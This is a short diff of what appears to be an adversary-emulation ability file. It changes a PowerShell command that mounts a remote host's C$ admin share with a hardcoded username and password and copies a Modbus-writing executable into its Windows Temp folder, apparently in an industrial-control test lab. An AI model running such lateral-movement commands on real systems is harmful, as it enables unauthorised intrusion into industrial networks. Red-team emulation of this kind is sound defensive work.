@@ -9,7 +9,7 @@
     windows:
       psh:
         command: |
-          net use \\172.17.24.12\C$ /user:txone tx1otexerc;
-          Copy-Item -Path "C:\Users\Public\modbus_writer.exe" -Destination "\\172.17.24.12\C$\Windows\Temp\" -Force
+          net use \\172.18.24.12\C$ /user:txone tx1otdemo;
+          Copy-Item -Path "C:\Users\Public\modbus_writer.exe" -Destination "\\172.18.24.12\C$\Windows\Temp\" -Force
         payloads:
           - modbus_writer.exe
